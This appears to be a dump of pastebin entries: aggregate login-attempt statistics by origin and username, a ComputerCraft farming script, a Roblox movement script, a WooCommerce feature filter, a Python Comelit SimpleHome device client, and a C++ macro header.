    ""Ethiotelecom"": 2,
    ""Xhost Internet Solutions LP"": 7,
    ""China Mobile communications corporation"": 1,
    ""Viettel Corporation"": 1,
    ""CNC Group CHINA169 Shannxi Province Network"": 1,
    ""Horizon LLC"": 4,
    ""Servers.com, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Red Byte LLC"": 2,
    ""Aceville Pte.ltd"": 51,
    ""Censys, Inc."": 2,
    ""Microsoft Corporation"": 1,
    ""LogicWeb Inc."": 2,
    ""Tencent Cloud Computing (Beijing) Co"": 1
  },
  ""org"": {
    ""Private Layer Inc"": 1,
    ""Flyservers S.A"": 6,
    ""Chinanet HE"": 2,
    ""UAB Host Baltic"": 6,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""Pengadilan Agama KLS 1A Bandung"": 1,
    ""Unknown"": 55,
    ""Xhost Internet Solutions"": 5,
    ""China Mobile"": 1,
    ""VIETEL"": 1,
    ""Xhostis"": 2,
    ""Alviva Holding Limited"": 3,
    ""Horizon LLC"": 4,
    ""Servers.com, Inc."": 2,
    ""Ucloud Information Technology"": 1,
    ""Censys, Inc."": 1,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Censys, Inc"": 1,
    ""NSQ-VENTURE"": 2
  },
  ""regionName"": {
    ""Zurich"": 1,
    ""Kaunas"": 6,
    ""Hebei"": 2,
    ""Vilnius"": 6,
    ""Moscow"": 6,
    ""California"": 14,
    ""West Java"": 1,
    ""Addis Ababa"": 2,
    ""North Holland"": 7,
    ""Guangdong"": 1,
    ""Ho Chi Minh"": 1,
    ""Shaanxi"": 1,
    ""Hesse"": 4,
    ""Texas"": 2,
    ""Virginia"": 2,
    ""Lesser Poland"": 2,
    ""Central and Western District"": 51,
    ""Michigan"": 1,
    ""North West"": 1
  },
  ""country"": {
    ""Switzerland"": 1,
    ""Lithuania"": 12,
    ""China"": 4,
    ""Russia"": 6,
    ""United States"": 19,
    ""Indonesia"": 1,
    ""Ethiopia"": 2,
    ""The Netherlands"": 7,
    ""Vietnam"": 1,
    ""Germany"": 4,
    ""Poland"": 2,
    ""Hong Kong"": 51,
    ""Singapore"": 1
  },
  ""account"": {
    ""Administr"": 10,
    ""Test"": 16,
    ""(empty)"": 8,
    ""jAjKUapcW"": 1,
    ""izUcUJ"": 1,
    ""IUiOOl"": 1,
    ""hello"": 55,
    ""a"": 1,
    ""etAbWGeaJ"": 1,
    ""KfJkxc"": 1,
    ""fXsOhr"": 1,
    ""Domain"": 7,
    ""Administrator"": 1,
    ""eXWQroFvp"": 1,
    ""kRuQzG"": 1,
    ""uQHafB"": 1,
    ""pamn"": 1,
    ""QePqZqiBx"": 1,
    ""VkHrdj"": 1,
    ""ehXxFN"": 1
  },
  ""keyboard"": {
    ""Unknown"": 111
  },
  ""client_build"": {
    ""Unknown"": 111
  },
  ""client_name"": {
    ""Unknown"": 111
  },
  ""ip_type"": {
    ""hosting"": 69,
    ""Unknown"": 37,
    ""proxy"": 2,
    ""mobile"": 1,
    ""hosting & proxy"": 2
  }
}"
dzALdn6h,Untitled,ZodWasTaken,Lua,Sunday 4th of February 2024 05:49:19 PM CDT,"monitor = peripheral.wrap(""back"")

success, blockData = turtle.inspect()
print(""Starting . . ."")
while(true) do
    success, blockData = turtle.inspect()
    if success then
        if blockData.state.age == 7 then
            turtle.select(1)
            turtle.dig()
            turtle.suck()
            turtle.select(1)
            turtle.dropUp()
            turtle.select(2)
            turtle.place()
         end
    end
    turtle.turnRight()
	os.sleep(1)
end"
ZHwFFmgk,Naruto Movement System Hidden Dev Application,TheCubrixCode,Lua,Sunday 4th of February 2024 05:32:48 PM CDT,"-- Customization
local SPRINT_KEYNBIND = Enum.KeyCode.LeftShift
local CHAKRAJUMP_KEYBIND = Enum.KeyCode.LeftControl
local DASH_KEYBIND = Enum.KeyCode.Q
local DashCD = 1.5
local SprintSpeed = 30
-- random variables used
local UIS = game:GetService('UserInputService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Assets = ReplicatedStorage.Assets
local Player = game:GetService('Players').LocalPlayer
local Character = Player.Character
local Humanoid = Character:WaitForChild('Humanoid')
local WalkSpeed = Humanoid.WalkSpeed
local Animator = Humanoid:FindFirstChildOfClass('Animator')
local HumRP = Character.HumanoidRootPart
local RunAnimation = Animator:LoadAnimation(Assets.Animations.Movement.Misc.Run)
local DoubleJumpAnimation = Animator:LoadAnimation(Assets.Animations.Movement.Misc.DoubleJump)
local ForWardDashAnim = Animator:LoadAnimation(Assets.Animations.Movement.Dashes:WaitForChild(""FrontDash""))
local LeftDashAnim = Animator:LoadAnimation(Assets.Animations.Movement.Dashes:WaitForChild(""LeftDash""))
local RightDashAnim = Animator:LoadAnimation(Assets.Animations.Movement.Dashes:WaitForChild(""RightDash""))
local BackDashAnim = Animator:LoadAnimation(Assets.Animations.Movement.Dashes:WaitForChild(""BackDash""))
local LeftAerialAnim = Animator:LoadAnimation(Assets.Animations.Movement.AerialDashes:WaitForChild('LeftAerialDash'))
local RightAerialAnim = Animator:LoadAnimation(Assets.Animations.Movement.AerialDashes:WaitForChild('RightAerialDash'))
local ChakraJumpChargeAnim = Animator:LoadAnimation(Assets.Animations.Movement.ChakraJump:WaitForChild('ChakraJumpCharge'))
local ChakraJumpAnim = Animator:LoadAnimation(Assets.Animations.Movement.ChakraJump:WaitForChild('ChakraJump'))
-- Variables
local SPRINTING = false
local DashDebounce = false
local DashingDebounce = false
-- Setting Prioritzation
ForWardDashAnim.Priority = Enum.AnimationPriority.Action2
LeftDashAnim.Priority = Enum.AnimationPriority.Action2
RightDashAnim.Priority = Enum.AnimationPriority.Action2
BackDashAnim.Priority = Enum.AnimationPriority.Action2
LeftAerialAnim.Priority = Enum.AnimationPriority.Action2
RightDashAnim.Priority = Enum.AnimationPriority.Action2
-- Other Variables
local Velocity = 120
local debounce = false
local duration = 0.25
local MaxForce = 20000
local NumberOfJumps = 0
local Stun = false
local charging = false
local charge = 0
local RPS = 50
-- Jump Power
Humanoid.JumpPower = 70
local JumpPower = Humanoid.JumpPower
Humanoid.UseJumpPower = true
-- Checking input
UIS.InputBegan:Connect(function(input: InputObject, gameProcessedEvent: boolean) 
	if gameProcessedEvent then return end
	if input.KeyCode == SPRINT_KEYNBIND and not Stun then
		if not SPRINTING then
			SPRINTING = true
			Humanoid.WalkSpeed = 0
			Character.Animate.walk.WalkAnim.AnimationId = Assets.Animations.Movement.Misc.Run.AnimationId
			task.wait(.1)
			Humanoid.WalkSpeed = SprintSpeed
		else
			SPRINTING = false
			Humanoid.WalkSpeed = 0
			Character.Animate.walk.WalkAnim.AnimationId = 'rbxassetid://16245459598'
			task.wait(.1)
			Humanoid.WalkSpeed = WalkSpeed
		end
	elseif input.KeyCode == DASH_KEYBIND and not Stun then
		-- Dashing and checking direction
		if DashDebounce == false then
			DashDebounce = true
			local BV = Instance.new(""BodyVelocity"")
			BV.Parent = HumRP
			BV.MaxForce = Vector3.new(MaxForce,0,MaxForce)
			if LeftDown and ForwardDown then

				ForWardDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)
				HumRP.CFrame = HumRP.CFrame * CFrame.Angles(0,math.rad(-45),0)
				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.RightVector * -Velocity
					until BV == nil
				end)
				
			elseif RightDown and ForwardDown then

				ForWardDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)
				HumRP.CFrame = HumRP.CFrame * CFrame.Angles(0,math.rad(45),0)
				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.RightVector * Velocity
					until BV == nil
				end)
				
			elseif RightDown and BackDown then

				BackDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)
				HumRP.CFrame = HumRP.CFrame * CFrame.Angles(0,math.rad(-45),0)

				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.RightVector * Velocity
					until BV == nil
				end)
			elseif LeftDown and BackDown then

				BackDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)
				HumRP.CFrame = HumRP.CFrame * CFrame.Angles(0,math.rad(45),0)
				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.RightVector * -Velocity
					until BV == nil
				end)
				
			elseif ForwardDown then
				ForWardDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)
				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.lookVector * Velocity
					until BV == nil
				end)
				

			elseif LeftDown then
				-- aerial dash check
				if NumberOfJumps < 1 then
					LeftDashAnim:Play()
				else
					LeftAerialAnim:Play()
				end
			
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)

				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.rightVector * -Velocity
					until BV == nil
				end)

			elseif RightDown then
				-- aerial dash check
				if NumberOfJumps < 1 then
					RightDashAnim:Play()
				else
					RightAerialAnim:Play()
				end
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)

				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.rightVector * Velocity
					until BV == nil
				end)
				
			elseif BackDown then

				BackDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)

				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.lookVector * -Velocity
					until BV == nil
				end)
				
			else

				BackDashAnim:Play()
				DashingDebounce = true
				task.delay(duration, function()
					BV:Destroy()
				end)
				task.delay(DashCD,function()
					DashDebounce = false
				end)
				task.spawn(function()
					repeat
						task.wait()
						BV.Velocity = HumRP.CFrame.lookVector * -Velocity
					until BV == nil
				end)
				
			end
		end
	elseif input.KeyCode == CHAKRAJUMP_KEYBIND then
		-- checking if the user is on/near the floor to charge the jump
		local raycastParams = RaycastParams.new()
		local rayOrigin = HumRP.Position
		raycastParams.FilterDescendantsInstances = {script.Parent}
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		local rayDirection = Vector3.new(HumRP.Position.X,HumRP.Position.Y-7,HumRP.Position.Z)
		local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
		if not raycastResult then return end
			Stun = true
			Humanoid.WalkSpeed = 0
			Humanoid.JumpPower = 0
			SPRINTING = false
			charging = true
			Character.Animate.walk.WalkAnim.AnimationId = 'rbxassetid://16245459598'
			for i,v in pairs(Animator:GetPlayingAnimationTracks()) do
				v:Stop()
			end
			ChakraJumpChargeAnim:Play()
			task.wait(.4)
			ChakraJumpChargeAnim:AdjustSpeed(0)
			-- freezing the charge animation until its ready to jump
	end
end)
UIS.InputEnded:Connect(function(input: InputObject, gameProcessedEvent: boolean)  
	if gameProcessedEvent then return end
	if input.KeyCode == CHAKRAJUMP_KEYBIND and charging == true then
		-- release jump
		charging = false
		Stun = false
		-- play chakra jump effect server sided
		script.RemoteEvent:FireServer()
		ChakraJumpChargeAnim:AdjustSpeed(1)
		ChakraJumpChargeAnim:Stop()
		ChakraJumpAnim:Play()
		Humanoid.WalkSpeed = WalkSpeed
		Humanoid.JumpPower = JumpPower
		local BV = Instance.new('BodyVelocity')
		BV.Parent = HumRP
		BV.MaxForce = Vector3.new(MaxForce,MaxForce,MaxForce)
		BV.Velocity = HumRP.CFrame.upVector*(50+(100*(charge/100)))
		game.Debris:AddItem(BV,.5)
		charge = 0
	end
end)
local CanJump = false
local JumpCooldown = .2
local MaxJumps = 2
-- Double jump system and counting jumps for aerial dashing
Humanoid.StateChanged:Connect(function(oldstate, newstate)
	if Enum.HumanoidStateType.Landed == newstate then
		NumberOfJumps = 0
		CanJump = false
	elseif Enum.HumanoidStateType.Freefall == newstate then
		task.wait(JumpCooldown)
		CanJump = true
	elseif Enum.HumanoidStateType.Jumping == newstate then
		CanJump = false
		NumberOfJumps += 1
	end
end)
-- checking if they can double jump
UIS.JumpRequest:Connect(function()
	if CanJump and NumberOfJumps < MaxJumps and Humanoid.JumpPower ~= 0 then
		Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		if NumberOfJumps == 1 then
			DoubleJumpAnimation:Play()
		end
	end
end)

-- checking which direction the user is moving for dashing
game:GetService('RunService').RenderStepped:Connect(function()
	local Player = game.Players.LocalPlayer
	local Char = Player.Character
	local Hum = Char:FindFirstChild(""Humanoid"")
		if UIS:IsKeyDown(Enum.KeyCode.W) then
			ForwardDown = true

		else
			ForwardDown = false
		end
		if UIS:IsKeyDown(Enum.KeyCode.A)  then
			LeftDown = true

		else
			LeftDown = false
		end
		if UIS:IsKeyDown(Enum.KeyCode.S) then
			BackDown = true

		else 
			BackDown = false
		end
		if UIS:IsKeyDown(Enum.KeyCode.D)then
			RightDown = true

		else 
			RightDown = false
		end
end)
-- charging for chakra dash
game:GetService('RunService').Stepped:Connect(function(Time,step)
	if charging then
		if (charge < 100) then
			local increment = RPS*step
			if (charge + increment) < 100 then
				charge += increment
				
			else
				charge = 100						
			end
		end
	end
end)"
T0yiKpY2,WooCommerce:  Disable WooCommerce admin features,YordanSoares,PHP,Sunday 4th of February 2024 05:14:49 PM CDT,"<?php
/**
 * WooCommerce:
 * Disable WooCommerce admin features
 */
add_filter( 'woocommerce_admin_features', function( $features ) {
    // Uncomment the features you want to be disabled
	$features_to_be_disabled = array(
		// 'activity-panels',
		// 'analytics',
		// 'product-block-editor',
		// 'coupons',
		// 'core-profiler',
		// 'customer-effort-score-tracks',
		// 'import-products-task',
		// 'experimental-fashion-sample-products',
		// 'shipping-smart-defaults',
		// 'shipping-setting-tour',
		// 'homescreen',
		// 'marketing',
		// 'mobile-app-banner',
		// 'navigation',
		// 'onboarding',
		// 'onboarding-tasks',
		// 'product-variation-management',
		// 'product-virtual-downloadable',
		// 'product-external-affiliate',
		// 'product-grouped',
		// 'remote-inbox-notifications',
		// 'remote-free-extensions',
		// 'payment-gateway-suggestions',
		// 'shipping-label-banner',
		// 'subscriptions',
		// 'store-alerts',
		// 'transient-notices',
		// 'woo-mobile-welcome',
		// 'wc-pay-promotion',
		// 'wc-pay-welcome-page',
	);
	 foreach( $features as $key => $feature ) {
		if ( in_array( $feature, $features_to_be_disabled ) ) {
			unset( $features[$key] );
		}
	 }
	return $features;
} );"
04YRhis9,latest,chemelli74,Python,Sunday 4th of February 2024 05:06:56 PM CDT,"""""""Support for Comelit SimpleHome.""""""
import asyncio
import functools
import threading
from abc import abstractmethod
from dataclasses import dataclass
from datetime import datetime
from http.cookies import SimpleCookie
from typing import Any

import aiohttp
import pint
from yarl import URL

from .const import (
    _LOGGER,
    ALARM_AREA_STATUS,
    ALARM_AREAS,
    ALARM_ZONE_STATUS,
    ALARM_ZONES,
    BRIDGE,
    CLIMATE,
    COVER,
    IRRIGATION,
    LIGHT,
    OTHER,
    SCENARIO,
    SLEEP_BETWEEN_BRIDGE_CALLS,
    SLEEP_BETWEEN_VEDO_CALLS,
    STATE_COVER,
    STATE_ON,
    VEDO,
    WATT,
    AlarmAreaState,
    AlarmZoneState,
)
from .exceptions import CannotAuthenticate, CannotConnect, CannotRetrieveData


@dataclass
class ComelitSerialBridgeObject:
    """"""Comelit SimpleHome Serial bridge class.""""""

    index: int
    name: str
    status: int
    human_status: str
    type: str
    val: int | dict[Any, Any]  # Temperature or Humidity (CLIMATE)
    protected: int
    zone: str
    power: float
    power_unit: str = WATT


@dataclass
class ComelitVedoAreaObject:
    """"""Comelit SimpleHome VEDO area class.""""""

    index: int
    name: str
    p1: bool
    p2: bool
    ready: bool
    armed: bool
    alarm: bool
    alarm_memory: bool
    sabotage: bool
    anomaly: bool
    in_time: bool
    out_time: bool
    human_status: AlarmAreaState


@dataclass
class ComelitVedoZoneObject:
    """"""Comelit SimpleHome VEDO zone class.""""""

    index: int
    name: str
    status_api: str
    status: int
    human_status: AlarmZoneState


class ComelitCommonApi:
    """"""Common API calls for Comelit SimpleHome devices.""""""

    def __init__(self, host: str, port: int, pin: int) -> None:
        """"""Initialize the session.""""""
        self.host = f""{host}:{port}""
        self.device_pin = pin
        self.base_url = f""http://{host}:{port}""
        self._headers = {
            ""User-Agent"": ""Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"",
            ""Accept-Language"": ""en-GB,en;q=0.5"",
            ""X-Requested-With"": ""XMLHttpRequest"",
            ""Connection"": ""keep-alive"",
        }
        self._session: aiohttp.ClientSession

    async def _get_page_result(
        self, page: str, reply_json: bool = True
    ) -> tuple[int, dict[str, Any]]:
        """"""Return status and data from a GET query.""""""
        _LOGGER.debug(""GET page %s [%s]"", page, self.host)
        timestamp = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")
        url = f""{self.base_url}{page}&_={timestamp}""
        try:
            response = await self._session.get(
                url,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            raise CannotConnect(""Connection error during GET"") from exc

        _LOGGER.debug(""GET response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            raise CannotRetrieveData(f""GET response status {response.status}"")

        if not reply_json:
            _LOGGER.debug(""GET response is empty [%s]"", self.host)
            return response.status, {}

        return response.status, await response.json()

    async def _post_page_result(
        self, page: str, payload: dict[str, Any]
    ) -> SimpleCookie:
        """"""Return status and data from a POST query.""""""
        _LOGGER.debug(""POST page %s [%s]"", page, self.host)
        url = f""{self.base_url}{page}""
        try:
            response = await self._session.post(
                url,
                data=payload,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            raise CannotConnect(""Connection error during POST"") from exc

        _LOGGER.debug(""POST response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            raise CannotRetrieveData(f""POST response status {response.status}"")

        return response.cookies

    async def _is_session_active(self) -> bool:
        """"""Check if aiohttp session is still active.""""""
        if not hasattr(self, ""_session"") or self._session.closed:
            return False

        return True

    async def _check_logged_in(self, host_type: str) -> bool:
        """"""Check if login is active.""""""

        reply_status, reply_json = await self._get_page_result(""/login.json"")

        _LOGGER.debug(""%s login reply: %s"", host_type, reply_json)
        if host_type == BRIDGE:
            logged = reply_json[""domus""] != ""000000000000""
        else:
            logged = reply_json[""logged""] == 1

        return logged

    async def _sleep_between_call(self, seconds: float) -> None:
        """"""Sleep between one call and the next one.""""""
        _LOGGER.debug(""Sleeping for %s seconds before next call"", seconds)
        await asyncio.sleep(seconds)

    @abstractmethod
    async def login(self) -> bool:
        """"""Login to Comelit device.""""""

    async def _login(self, payload: dict[str, Any], host_type: str) -> bool:
        """"""Login into Comelit device.""""""
        _LOGGER.debug(""Logging into host %s [%s]"", self.host, host_type)

        if not await self._is_session_active():
            _LOGGER.debug(""Creating HTTP ClientSession"")
            jar = aiohttp.CookieJar(unsafe=True)
            connector = aiohttp.TCPConnector(force_close=True)
            self._session = aiohttp.ClientSession(cookie_jar=jar, connector=connector)

        if await self._check_logged_in(host_type):
            return True

        cookies = await self._post_page_result(""/login.cgi"", payload)
        _LOGGER.debug(""Cookies for host %s: %s"", self.host, cookies)

        if not cookies:
            _LOGGER.warning(
                ""Authentication failed for host %s [%s]: no cookies received"",
                self.host,
                host_type,
            )
            raise CannotAuthenticate

        self._session.cookie_jar.update_cookies(cookies, URL(self.base_url))

        return await self._check_logged_in(host_type)

    async def logout(self) -> None:
        """"""Comelit Simple Home logout.""""""
        if await self._is_session_active():
            payload = {""logout"": 1}
            await self._post_page_result(""/login.cgi"", payload)
            self._session.cookie_jar.clear()

    async def close(self) -> None:
        """"""Comelit Simple Home close session.""""""
        if await self._is_session_active():
            await self._session.close()


class ComeliteSerialBridgeApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome Serial bridge.""""""

    def __init__(self, host: str, port: int, bridge_pin: int) -> None:
        """"""Initialize the session.""""""
        super().__init__(host, port, bridge_pin)
        self._devices: dict[str, dict[int, ComelitSerialBridgeObject]] = {}
        self._last_clima_command: datetime | None = None
        self._semaphore = threading.Semaphore()

    async def _translate_device_status(self, dev_type: str, dev_status: int) -> str:
        """"""Makes status human readable.""""""

        if dev_type == COVER:
            return STATE_COVER[dev_status]

        return ""on"" if dev_status == STATE_ON else ""off""

    async def set_clima_status(self, index: int, action: str, temp: float = 0) -> bool:
        """"""Set clima status.

        action:
            auto, man, on, off, set

        """"""
        self._semaphore.acquire()
        if self._last_clima_command:
            delta_seconds = SLEEP_BETWEEN_BRIDGE_CALLS - round(
                (datetime.now() - self._last_clima_command).total_seconds(), 2
            )
            if delta_seconds > 0:
                _LOGGER.debug(
                    ""Climate calls needs to be queued (%ss) for proper execution"",
                    delta_seconds,
                )
                await self._sleep_between_call(delta_seconds)

        reply_status = await self._get_page_result(
            f""/user/action.cgi?clima={index}&thermo={action}&val={int(temp*10)}"", False
        )
        self._last_clima_command = datetime.now()
        self._semaphore.release()
        return reply_status == 200

    async def set_device_status(
        self, device_type: str, index: int, action: int
    ) -> bool:
        """"""Set device action.

        action:
            0 = off/close
            1 = on/open

        """"""
        reply_status = await self._get_page_result(
            f""/user/action.cgi?type={device_type}&num{action}={index}"", False
        )
        return reply_status == 200

    async def get_device_status(self, device_type: str, index: int) -> int:
        """"""Get device status.""""""
        reply_status, reply_json = await self._get_page_result(
            f""/user/icon_status.json?type={device_type}""
        )
        _LOGGER.debug(
            ""Device %s[%s] status: %s"", device_type, index, reply_json[""status""][index]
        )
        return reply_json[""status""][index]

    async def login(self) -> bool:
        """"""Login to Serial Bridge device.""""""
        payload = {""dom"": self.device_pin}
        return await self._login(payload, BRIDGE)

    async def get_all_devices(self) -> dict[str, dict[int, ComelitSerialBridgeObject]]:
        """"""Get all connected devices.""""""

        _LOGGER.debug(""Getting all devices for host %s"", self.host)

        loop = asyncio.get_running_loop()
        ureg = await loop.run_in_executor(
            None, functools.partial(pint.UnitRegistry, cache_folder="":auto:"")
        )
        ureg.default_format = ""~""

        for dev_type in (CLIMATE, COVER, LIGHT, IRRIGATION, OTHER, SCENARIO):
            reply_status, reply_json = await self._get_page_result(
                f""/user/icon_desc.json?type={dev_type}""
            )
            _LOGGER.debug(
                ""List of devices of type %s: %s"",
                dev_type,
                reply_json,
            )
            reply_counter_json: dict[str, Any] = {}
            if dev_type == OTHER and reply_json[""num""] > 0:
                reply_status, reply_counter_json = await self._get_page_result(
                    ""/user/counter.json""
                )
            devices = {}
            for i in range(reply_json[""num""]):
                # Guard against ""scenario"", that has 32 devices even if none is configured
                if reply_json[""desc""][i] == """":
                    continue
                status = reply_json[""status""][i]
                power = 0.0
                if instant_values := reply_counter_json.get(""instant""):
                    instant = ureg(instant_values[i])
                    if not instant.dimensionless:
                        power = ureg.convert(
                            instant.magnitude, str(instant.units), WATT
                        )
                dev_info = ComelitSerialBridgeObject(
                    index=i,
                    name=reply_json[""desc""][i],
                    status=status,
                    human_status=await self._translate_device_status(dev_type, status),
                    type=dev_type,
                    val=reply_json[""val""][i],
                    protected=reply_json[""protected""][i],
                    zone=reply_json[""env_desc""][reply_json[""env""][i]]
                    if not dev_type == SCENARIO
                    else """",
                    power=power,
                )
                devices.update({i: dev_info})
            self._devices.update({dev_type: devices})

        return self._devices


class ComelitVedoApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome VEDO alarm.""""""

    _json_data: list[dict[Any, Any]] = [{}, {}, {}, {}, {}]

    async def _translate_zone_status(
        self, zone: ComelitVedoZoneObject
    ) -> AlarmZoneState:
        """"""Translate ZONE status.""""""

        for status in ALARM_ZONE_STATUS:
            if zone.status & status != 0:
                return ALARM_ZONE_STATUS[status]

        return AlarmZoneState.REST

    async def _translate_area_status(
        self, area: ComelitVedoAreaObject
    ) -> AlarmAreaState:
        """"""Translate AREA status.""""""

        for field in ALARM_AREA_STATUS:
            if getattr(area, field):
                return ALARM_AREA_STATUS[field]

        return AlarmAreaState.DISARMED

    async def _create_area_object(
        self, json_area_desc: dict[str, Any], json_area_stat: dict[str, Any], index: int
    ) -> ComelitVedoAreaObject:
        """"""Get area status.""""""

        area = ComelitVedoAreaObject(
            index=index,
            name=json_area_desc[""description""][index],
            p1=json_area_desc[""p1_pres""][index],
            p2=json_area_desc[""p2_pres""][index],
            ready=json_area_stat[""ready""][index],
            armed=json_area_stat[""armed""][index],
            alarm=json_area_stat[""alarm""][index],
            alarm_memory=json_area_stat[""alarm_memory""][index],
            sabotage=json_area_stat[""sabotage""][index],
            anomaly=json_area_stat[""anomaly""][index],
            in_time=json_area_stat[""in_time""][index],
            out_time=json_area_stat[""out_time""][index],
            human_status=AlarmAreaState.UNKNOWN,
        )
        area.human_status = await self._translate_area_status(area)
        _LOGGER.debug(area)
        return area

    async def _create_zone_object(
        self, json_zone_desc: dict[str, Any], json_zone_stat: dict[str, Any], index: int
    ) -> ComelitVedoZoneObject:
        """"""Create zone object.""""""

        status_api = json_zone_stat[""status""].split("","")[index]

        zone = ComelitVedoZoneObject(
            index=index,
            name=json_zone_desc[""description""][index],
            status=int(status_api, 16),
            status_api=status_api,
            human_status=AlarmZoneState.UNKNOWN,
        )
        zone.human_status = await self._translate_zone_status(zone)
        _LOGGER.debug(zone)
        return zone

    async def _async_get_page_data(
        self, desc: str, page: str, present_check: str | int | None = None
    ) -> tuple[bool, dict[str, Any]]:
        """"""Return status and data from a specific GET query.""""""
        reply_status, reply_json = await self._get_page_result(page)
        _LOGGER.debug(""Alarm %s: %s"", desc, reply_json)
        present = present_check in reply_json[""present""] if ""_desc"" in page else True
        return (reply_json[""logged""] and present), reply_json

    async def set_zone_status(
        self, index: int, action: str, force: bool = False
    ) -> bool:
        """"""Set zone action.

        action:
            tot = enable
            dis = disable

        index:
            32 = all zones
             n = specific zone

        force:
            False = don't force action
            True  = force action

        """"""

        reply_status = await self._get_page_result(
            f""/action.cgi?vedo=1&{action}={index}&force={int(force)}"", False
        )
        return reply_status == 200

    async def login(self) -> bool:
        """"""Login to VEDO system.""""""
        payload = {""code"": self.device_pin}
        return await self._login(payload, VEDO)

    async def get_area_status(
        self, area: ComelitVedoAreaObject
    ) -> ComelitVedoAreaObject:
        """"""Get AREA status.""""""

        reply_status, reply_json_area_stat = await self._async_get_page_data(
            ""AREA statistics"", ""/user/area_stat.json""
        )
        description = {""description"": area.name, ""p1_pres"": area.p1, ""p2_pres"": area.p2}

        return await self._create_area_object(
            description, reply_json_area_stat, area.index
        )

    async def get_all_areas_and_zones(
        self,
    ) -> dict[str, dict[int, Any]]:
        """"""Get all VEDO system AREA and ZONE.""""""

        queries: dict[int, dict[str, Any]] = {
            1: {
                ""desc"": ""AREA description"",
                ""page"": ""/user/area_desc.json"",
                ""present"": 1,
            },
            2: {
                ""desc"": ""ZONE description"",
                ""page"": ""/user/zone_desc.json"",
                ""present"": ""1"",
            },
            3: {
                ""desc"": ""AREA statistics"",
                ""page"": ""/user/area_stat.json"",
                ""present"": None,
            },
            4: {
                ""desc"": ""ZONE statistics"",
                ""page"": ""/user/zone_stat.json"",
                ""present"": None,
            },
        }

        for index, info in queries.items():
            desc = info[""desc""]
            page = info[""page""]
            present = info[""present""]
            if ""_desc"" in page and self._json_data[index]:
                _LOGGER.debug(""Data for %s already retrieved, skipping"", desc)
                continue
            await self._sleep_between_call(SLEEP_BETWEEN_VEDO_CALLS)
            reply_status, reply_json = await self._async_get_page_data(
                desc, page, present
            )
            if not reply_status:
                _LOGGER.info(""Login expired accessing %s, re-login attempt"", desc)
                await self.login()
                await self._sleep_between_call(SLEEP_BETWEEN_VEDO_CALLS)
                reply_status, reply_json = await self._async_get_page_data(
                    desc, page, present
                )
                if not reply_status:
                    raise CannotRetrieveData(
                        ""Login expired and not working after a retry""
                    )
                _LOGGER.info(""Re-login successful"")
            self._json_data.insert(index, reply_json)

        list_areas: list[int] = self._json_data[1][""present""]
        areas = {}
        for i in range(len(list_areas)):
            if not list_areas[i]:
                _LOGGER.debug(""Alarm skipping non present AREA [%i]"", i)
                continue
            area = await self._create_area_object(
                self._json_data[1], self._json_data[3], i
            )
            areas.update({i: area})

        list_zones: list[int] = self._json_data[2][""present""]
        zones = {}
        for i in range(len(list_zones)):
            if not int(list_zones[i]):
                _LOGGER.debug(""Alarm skipping non present ZONE [%i]"", i)
                continue
            zone = await self._create_zone_object(
                self._json_data[2], self._json_data[4], i
            )
            zones.update({i: zone})

        return {ALARM_AREAS: areas, ALARM_ZONES: zones}
"
5LLkCT8q,Untitled,Rofyda_Elghadban1,C++,Sunday 4th of February 2024 04:51:58 PM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define sz(x) (int)(x.size())
 #define all(v) ((v).begin()), ((v).end())
